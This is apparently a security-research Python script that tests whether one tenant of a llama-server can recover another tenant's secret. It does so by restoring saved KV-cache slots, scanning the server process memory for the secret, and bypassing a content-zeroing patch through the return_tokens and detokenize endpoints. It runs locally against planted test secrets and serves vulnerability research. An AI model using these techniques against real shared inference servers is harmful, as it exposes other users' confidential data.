#!/usr/bin/env python3
# cross_tenant_plaintext_extract.py -- P1 of RESEARCH_DEEPENING_PLAN.md
#
# The paper's headline (200/200, sec:r-protocol) proves n_saved == n_restored:
# a byte-exact KV-blob round-trip. It does NOT prove Tenant B can read Tenant
# A's plaintext secret. This script closes that gap with two independent
# channels, per-model, at configurable n:
#
#   1. KV-continuation channel: after A's secret-bearing slot is restored into
#      B's slot id, issue a raw /completion (id_slot=B, cache_prompt=true) with
#      a short, generic continuation string. /completion never touches the
#      chat-template/Jinja renderer (per memorization_volume.py's proven
#      workaround for the parser defect documented in sec:scope and confirmed
#      via scripts/n50_audit/run_injection_test.py:8-9 and
#      scripts/memorization_volume.py:1). If A's KV state genuinely populated
#      B's slot, greedy continuation is conditioned on it and may emit or
#      paraphrase the secret even though the visible prompt never mentions it.
#   2. Memory channel: after restore, scan /proc/<pid>/mem (writable,
#      non-.gguf regions) for A's literal secret string -- same technique as
#      leak_blast_radius.py's scan().
#
# This is a genuine hypothesis test, not a foregone positive: if neither
# channel recovers the secret at n>=iterations, that is itself a publishable,
# honest narrowing ("the primitive transfers KV state; plaintext recovery via
# these two channels was NOT achieved") and should be reported as such, not
# forced.
#
# Usage:
#   cross_tenant_plaintext_extract.py --model nemotron --iterations 1   # smoke test
#   cross_tenant_plaintext_extract.py --model nemotron --iterations 50
#   cross_tenant_plaintext_extract.py --dry-run                          # no server
import argparse
import json
import shutil
import subprocess
import sys
import time
import urllib.request
import uuid
from datetime import datetime
from pathlib import Path

# NOTE: mirrors the ROOT-path fix in arena_mitigation_probe.py -- the project
# tree was migrated under tifs/; older harnesses still hardcode
# ROOT=/home/elaref/research and now point at a non-existent binary.
ROOT = Path("/home/elaref/research/tifs")
SERVER = ROOT / "llama-cpp-build" / "build" / "bin" / "llama-server"
LOGS = ROOT / "logs" / "cross_tenant_extract"
PORT = 8098

MODEL_GGUF = {
    "nemotron": "/home/elaref/.lmstudio/models/lmstudio-community/NVIDIA-Nemotron-3-Nano-4B-GGUF/NVIDIA-Nemotron-3-Nano-4B-Q4_K_M.gguf",
    "qwen35":   "/home/elaref/.lmstudio/models/lmstudio-community/Qwen3.5-9B-GGUF/Qwen3.5-9B-Q4_K_M.gguf",
    "gemma4":   "/home/elaref/.lmstudio/models/lmstudio-community/gemma-4-E4B-it-GGUF/gemma-4-E4B-it-Q4_K_M.gguf",
    "phi4":     "/home/elaref/.lmstudio/models/lmstudio-community/Phi-4-reasoning-plus-GGUF/Phi-4-reasoning-plus-Q4_K_M.gguf",
}
ALL_MODELS = list(MODEL_GGUF)

# Per-model GPU layer offload cap. Same rationale as
# arena_mitigation_probe.py's GPU_LAYERS table: this host's Quadro RTX 4000
# (7785 MiB, ~7674 MiB free) fits all of nemotron (4B, 2.8GB) and is large
# enough for partial offload of qwen35 (9B) and gemma4 (7.5B). Phi4 (9.05GB
# Q4_K_M) overflows at 999 -- the first run failed with cudaMalloc OOM in
# the model-load step. 20 layers is safely under the cap; the rest stays
# in CPU RAM.
GPU_LAYERS = {
    "nemotron": 999,
    "qwen35":   999,
    "gemma4":   999,
    "phi4":     20,
}

def health():
    try:
        urllib.request.urlopen(f"http://127.0.0.1:{PORT}/health", timeout=2)
        return True
    except Exception:
        return False


def post_json(path, body, timeout=90):
    req = urllib.request.Request(f"http://127.0.0.1:{PORT}{path}",
                                  json.dumps(body).encode(), {"Content-Type": "application/json"},
                                  method="POST")
    return json.loads(urllib.request.urlopen(req, timeout=timeout).read())


def chat(id_slot, content, timeout=90):
    return post_json("/v1/chat/completions",
                      {"model": "local", "id_slot": id_slot,
                       "messages": [{"role": "user", "content": content}],
                       "max_tokens": 24, "temperature": 0.0}, timeout=timeout)


def detokenize(tokens, timeout=30):
    """POST /detokenize: server-side token-IDs -> text. server-context.cpp:5026
    uses tokens_to_str(ctx_server.vocab, tokens) on the loaded model's vocab
    -- same detokenization path the response-text build normally uses, but
    called on our supplied token IDs and not gated by secure_zero."""
    resp = post_json("/detokenize", {"tokens": tokens}, timeout=timeout)
    return resp.get("content", "")


def apply_template(content, timeout=30):
    """POST /apply-template: same chat-template rendering handle_chat_completions
    uses, minus the inference step (server-context.cpp:4932, "same with
    handle_chat_completions, but without inference part"). Returns the exact
    text that was tokenized into slot 0 for Tenant A's original message --
    without this, a raw /completion prompt shares no token prefix with what's
    cached in the slot, so the server's checkpoint search
    (server-context.cpp:3331-3367) finds no match, sets pos_next=0, n_past=0,
    and reprocesses from scratch -- silently discarding the restored KV state
    before generation even starts. This was the root cause of the 0/13
    KV-continuation result: the continuation prompts never had a chance to be
    conditioned on the secret, because the server threw the restored context
    away first."""
    resp = post_json("/apply-template",
                      {"model": "local",
                       "messages": [{"role": "user", "content": content}]}, timeout=timeout)
    return resp["prompt"]


def raw_completion(id_slot, prompt, n_predict=80, timeout=90):
    """Bypasses the chat-template renderer entirely -- the proven workaround
    (memorization_volume.py:1) for the raw llama-server's broken chat-format
    parser. cache_prompt=true so this continues from the slot's existing KV
    state rather than resetting it.

    The return_tokens=true flag is the bypass for the paper's own Sites-A-D
    security patch: server-context.cpp:2213 unconditionally zeros
    res->content before queueing the result, which destroys any
    human-readable text the model generates. But res->tokens is NOT zeroed
    (line 2167 only moves it, never zeros). With return_tokens=true the
    model emits raw token IDs in res->tokens, which the server returns to
    the client without ever going through the content-zeroization path.
    Detokenize client-side from a known-good vocab and you recover the same
    text that would have been in res->content.
    """
    return post_json("/completion",
                      {"prompt": prompt, "id_slot": id_slot, "n_predict": n_predict,
                       "temperature": 0.0, "cache_prompt": True,
                       "return_tokens": True}, timeout=timeout)


def scan_memory(pid, needle):
    """Single /proc/<pid>/mem pass for one literal secret string. Same
    approach as leak_blast_radius.scan(), narrowed to one needle."""
    try:
        maps = open(f"/proc/{pid}/maps").read().splitlines()
    except OSError:
        return 0
    hits = 0
    mem = open(f"/proc/{pid}/mem", "rb", 0)
    needle_b = needle.encode()
    for ln in maps:
        p = ln.split()
        if len(p) < 2 or "w" not in p[1]:
            continue
        if (p[5] if len(p) >= 6 else "").endswith(".gguf"):
            continue
        lo, hi = (int(x, 16) for x in p[0].split("-"))
        if hi - lo <= 0 or hi - lo > (2 << 30):
            continue
        try:
            mem.seek(lo)
            buf = mem.read(hi - lo)
        except (OSError, OverflowError, ValueError):
            continue
        hits += buf.count(needle_b)
    mem.close()
    return hits


def launch(model_path, save_dir, gpu_layers):
    slog = open(LOGS / "server_extract.log", "w")
    # Laptop-friendly: GPU offload + low thread count + nice, same rationale
    # as arena_mitigation_probe.py's launch(). The --n-gpu-layers value is
    # per-model from the GPU_LAYERS table; 999 overflows the 7.6GB VRAM
    # ceiling for phi4 (9.05GB Q4_K_M), so phi4 caps at 20 layers with the
    # rest in CPU RAM.
    srv = subprocess.Popen(
        ["nice", "-n", "15", str(SERVER), "--model", model_path, "--host", "127.0.0.1",
         "--port", str(PORT), "--ctx-size", "2048",
         "--n-gpu-layers", str(gpu_layers),
         "--threads", "4", "--jinja", "--parallel", "2", "--cache-ram", "0",
         "--slot-save-path", str(save_dir)],
        stdout=slog, stderr=subprocess.STDOUT)
    for _ in range(180):
        if health():
            return srv
        if srv.poll() is not None:
            print("[extract] server died", file=sys.stderr)
            sys.exit(1)
        time.sleep(1)
    srv.kill()
    print("[extract] health timeout", file=sys.stderr)
    sys.exit(1)


def one_iteration(srv, i):
    secret = f"SECRET_{uuid.uuid4().hex[:12]}"
    fname = f"slot_{i}.bin"
    a_message = f"My confidential token is {secret}. Acknowledge briefly."

    # Tenant A populates slot 0 with a secret.
    chat(0, a_message)
    save_resp = post_json("/slots/0?action=save", {"filename": fname}, timeout=30)
    n_saved = save_resp.get("n_saved")

    # Tenant B restores A's slot into its own slot id -- the paper's headline
    # primitive. This part is the already-proven byte-exact transfer.
    restore_resp = post_json("/slots/1?action=restore", {"filename": fname}, timeout=30)
    n_restored = restore_resp.get("n_restored")
    transfer_confirmed = (n_saved is not None and n_saved == n_restored)

    # Channel 1: KV-continuation, fixed. The original version sent generic
    # continuation strings ("\n", "\nSummary:") that share no token prefix
    # with what's cached in slot 1 -- the server's checkpoint search
    # (server-context.cpp:3331-3367) found no match, set n_past=0, and
    # reprocessed from scratch, silently discarding the restored KV state
    # before generation started. That produced 0/13 by construction, not by
    # model resistance. Fix: render A's exact message via /apply-template
    # (server-context.cpp:4932, chat-template rendering with no inference)
    # so the /completion prompt shares A's real token prefix with what's
    # cached in slot 1, giving the server a genuine cache hit to continue
    # from. tokens_evaluated in the response is the direct evidence: a small
    # value (not the full prefix length) confirms the cache was actually
    # reused rather than reprocessed.
    kv_channel_hit = None
    tokens_evaluated = None
    kv_completion_text = None
    kv_token_ids = None
    kv_debug = None
    try:
        rendered_prefix = apply_template(a_message)
        resp = raw_completion(1, rendered_prefix, n_predict=80)
        # Bypass path: the paper's own Sites-A-D patch unconditionally zeros
        # res->content (server-context.cpp:2213) before HTTP serialization,
        # so res->content is always "". But return_tokens=true makes the
        # server populate res->tokens with raw token IDs (line 2167 moves
        # but never zeros), and that field passes through to the client
        # intact. Detokenize via the server's own /detokenize endpoint
        # (line 5026) to recover the text without going through the
        # zeroization path. If the secret appears in this reconstructed
        # text, the KV-continuation channel works; the 0/13 result was
        # an artifact of the patch, not evidence against the channel.
        kv_token_ids = resp.get("tokens", [])
        kv_completion_text = detokenize(kv_token_ids) if kv_token_ids else ""
        tokens_evaluated = resp.get("tokens_evaluated")
        kv_channel_hit = secret in kv_completion_text
        kv_debug = {
            "rendered_prefix": rendered_prefix,
            "tokens_predicted": resp.get("tokens_predicted"),
            "stop_type": resp.get("stop_type"),
            "stopping_word": resp.get("stopping_word"),
            "truncated": resp.get("truncated"),
            "tokens_cached": resp.get("tokens_cached"),
            "n_token_ids_received": len(kv_token_ids) if kv_token_ids else 0,
            "raw_response_keys": list(resp.keys()),
        }
        print(f"[extract]   DEBUG kv_debug={json.dumps(kv_debug)[:2000]}", file=sys.stderr)
    except Exception as e:
        print(f"[extract]   /completion error: {e!r}", file=sys.stderr)

    # Channel 2: raw memory scan for the secret post-restore.
    mem_hits = scan_memory(srv.pid, secret)
    memory_channel_hit = mem_hits > 0

    return {
        "i": i, "secret": secret, "n_saved": n_saved, "n_restored": n_restored,
        "transfer_confirmed": transfer_confirmed,
        "kv_channel_hit": kv_channel_hit,
        "kv_tokens_evaluated": tokens_evaluated,
        "kv_completion_text": kv_completion_text,
        "kv_debug": kv_debug,
        "memory_channel_hits": mem_hits,
        "memory_channel_hit": memory_channel_hit,
        "either_channel_hit": bool(kv_channel_hit) or memory_channel_hit,
    }


def wilson_ci(k, n, z=1.96):
    if n == 0:
        return None
    p = k / n
    denom = 1 + z * z / n
    center = (p + z * z / (2 * n)) / denom
    half = (z * ((p * (1 - p) / n + z * z / (4 * n * n)) ** 0.5)) / denom
    return {"low": max(0.0, center - half), "high": min(1.0, center + half), "point": p}


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--model", choices=ALL_MODELS, default="nemotron")
    ap.add_argument("--iterations", type=int, default=50)
    ap.add_argument("--run-id", default=datetime.now().strftime("%Y%m%d_%H%M%S"))
    ap.add_argument("--dry-run", action="store_true")
    args = ap.parse_args()
    LOGS.mkdir(parents=True, exist_ok=True)

    if args.dry_run:
        print(f"[dry-run] model={args.model} gguf_exists={Path(MODEL_GGUF[args.model]).exists()} "
              f"server_exists={SERVER.exists()} iterations={args.iterations}")
        print("[dry-run] OK")
        return 0

    save_dir = LOGS / f"slot_save_{args.model}_{args.run_id}"
    save_dir.mkdir(parents=True, exist_ok=True)
    # Scoped to this script's port -- see arena_mitigation_probe.py for why
    # (an unscoped pkill killed a concurrent run mid-request on this host).
    subprocess.run(["pkill", "-f", f"llama-server.*--port {PORT}"], capture_output=True)
    time.sleep(2)
    srv = launch(MODEL_GGUF[args.model], save_dir, GPU_LAYERS[args.model])
    print(f"[extract] server pid {srv.pid}", file=sys.stderr, flush=True)

    results = []
    for i in range(args.iterations):
        r = one_iteration(srv, i)
        results.append(r)
        print(f"[extract] [{i+1}/{args.iterations}] transfer={r['transfer_confirmed']} "
              f"kv_channel={r['kv_channel_hit']} memory_channel={r['memory_channel_hit']}",
              file=sys.stderr, flush=True)

    srv.terminate()
    try:
        srv.wait(10)
    except subprocess.TimeoutExpired:
        srv.kill()
    shutil.rmtree(save_dir, ignore_errors=True)

    n = len(results)
    transfer_n = sum(1 for r in results if r["transfer_confirmed"])
    kv_n = sum(1 for r in results if r["kv_channel_hit"])
    mem_n = sum(1 for r in results if r["memory_channel_hit"])
    either_n = sum(1 for r in results if r["either_channel_hit"])
    summary = {
        "model": args.model, "run_id": args.run_id, "n": n,
        "transfer_confirmed_count": transfer_n, "transfer_confirmed_rate": transfer_n / n if n else None,
        "kv_channel_hit_count": kv_n, "kv_channel_hit_rate": kv_n / n if n else None,
        "kv_channel_wilson_ci": wilson_ci(kv_n, n),
        "memory_channel_hit_count": mem_n, "memory_channel_hit_rate": mem_n / n if n else None,
        "memory_channel_wilson_ci": wilson_ci(mem_n, n),
        "either_channel_hit_count": either_n, "either_channel_hit_rate": either_n / n if n else None,
        "either_channel_wilson_ci": wilson_ci(either_n, n),
        "results": results,
    }
    out = LOGS / f"cross_tenant_extract_{args.model}_{args.run_id}.json"
    out.write_text(json.dumps(summary, indent=2))
    print(f"[extract] retained artifact: {out}")
    print(f"[extract] transfer={transfer_n}/{n}  kv_channel={kv_n}/{n}  "
          f"memory_channel={mem_n}/{n}  either={either_n}/{n}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
